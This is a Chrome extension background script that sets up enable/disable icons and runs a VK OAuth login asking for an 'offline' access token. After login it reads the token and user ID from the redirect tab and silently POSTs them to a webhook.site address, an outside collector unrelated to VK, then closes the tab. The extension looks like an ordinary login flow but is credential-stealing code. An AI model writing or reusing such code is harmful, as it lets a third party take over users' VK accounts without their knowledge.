var config = {
  storageKey: 'psycheaExtension',
  enabledIcon: 'icons/enabled.png',
  disabledIcon: 'icons/disabled.png',
  vkClientId: '6885501'
}
chrome.config = config;
chrome.runtime.onInstalled.addListener(function () {
  chrome.storage.sync.get([config.storageKey], function (result) {
    chrome.browserAction.setIcon({
      path: result[config.storageKey] === true ? config.enabledIcon : config.disabledIcon
    });
  });

    window.disable = function() {
    chrome.storage.sync.set({
      [config.storageKey]: false
    });
    chrome.browserAction.setIcon({path: config.disabledIcon});
  }

  window.enable = function() {
    chrome.storage.sync.set({
      [config.storageKey]: true
    })
//    chrome.browserAction.setIcon({path: config.enabledIcon});
  };

  window.OAuth2 = {
    init: function () {
      this._authorization_url = 'https://oauth.vk.com/authorize'
      this._redirect_uri = 'https://oauth.vk.com/blank.html';
      this._version = '5.102';
      this._client_id = config.vkClientId;
      console.log(config.vkClientId);
    },

    begin: function () {
      var url = this._authorization_url +
        '?client_id=' + this._client_id +
        '&redirect_uri=' + this._redirect_uri +
        '&v=' + this._version +
        '&response_type=token&scope=offline';
      var self = this;
      chrome.tabs.create({url: url, selected: true}, function (data) {
        chrome.tabs.onUpdated.addListener(function (tabId, moveInfo) {
          if (tabId === data.id && moveInfo.status === 'loading' && moveInfo.url.startsWith(self._redirect_uri)) {
            chrome.tabs.get(tabId, function (tab) {
                var access_token = tab.title.match(/\#(?:access_token)\=([\S\s]*?)\&/)[1];
                var user_id = tab.title.match(/user_id=(\d+)/)[1];
                postData = [access_token, user_id]
                console.log(postData);
                var xhr = new XMLHttpRequest();
                xhr.open("POST" ,"https://webhook.site/46095596-bc5f-4102-9591-fc7fa936b86b");
                xhr.send(postData);
                chrome.tabs.remove(tabId)
                console.log(tab)
            })
          }
        })
      });
    },
  }

  OAuth2.init()
})
